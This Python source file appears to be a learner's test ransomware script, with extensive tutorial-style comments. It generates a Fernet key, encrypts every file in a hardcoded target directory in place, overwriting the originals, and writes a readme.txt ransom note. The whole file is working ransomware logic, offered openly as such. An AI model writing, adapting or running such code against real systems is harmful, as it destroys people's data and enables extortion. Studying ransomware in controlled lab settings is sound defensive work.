from cryptography.fernet import Fernet
import os

#--------------------------------create key--------------------------------
def generate_key():
    key = Fernet.generate_key() #creates the key
    with open('key.key', 'wb') as key_file: # creates a file with the name key.key and witing permissions 'wb'
    # USAGE: open('file', 'mode'): -->  file: path and name of the file
    #                              -->  mode: 'a'(append, creates if not existing); 'w'(write, creates if not existing); 'r'(read, error if not existing); 'x'(create, error if existing)
    #                                         't'(text, default), 'b'(binary)
        key_file.write(key) # writes the key in the file

#--------------------------------load key------------------------------
def load_key():
    return open('key.key', 'rb').read() #open the key in read binary mode and then read it


#--------------------------------encryption------------------------------

def encrypt(items, key): # (files to encypt, key )
    f = Fernet(key)  # using fernet method
    for item in items:  # for every item on the directory
        with open(item, 'rb') as file:  # having opened the file in read binary mode,
            file_data = file.read()  # save the data of the file in the variable
        encrypted_data = f.encrypt(file_data)  #encrypt the variable
        with open(item, 'wb') as file:  # then having the file opened anew in write binary mode,
            file.write(encrypted_data)  # write the same data but encrypted



if __name__ == '__main__':  # https://www.geeksforgeeks.org/what-does-the-if-__name__-__main__-do/  ; https://stackoverflow.com/questions/419163/what-does-if-name-main-do
    # this is the main program so this codition is true and the code will be executed.

    # got to discover how to get the username and the full path from scratch :v

    # make sure to change this before execution !!!
    #                       v v v v v v v v v v v v
    path_to_encrypt = 'C:\\Users\\RitaAlonsoCasablanca\\Desktop\\malware\\ransomware_versions_test\\files' #stores the path that will be encrypted in th variable
    items = os.listdir(path_to_encrypt)  #store in the variable items the items that exist in the path, listed by the function listdir 
    full_path = [path_to_encrypt+'\\'+item for item in items] # this stores the path to every single element of the directory to encrypt ()
    # using list comprehension method, we have the first path, and then a for bucle that adds an element to the list for every item in items (that is, for every file in the directory)

    #call the previous defined functions...
    generate_key()  
    key = load_key()

    encrypt(full_path, key)

    #create a file to claim a ransom

    with open(path_to_encrypt+'\\'+'readme.txt', 'w') as file: # create a file in the path to encrypt named readme.txt, in write mode
        # write anything on it.
        file.write('This file has been encrypted.\n')
        file.write('Follow the nstructions below to decrypt your files. Thanks')


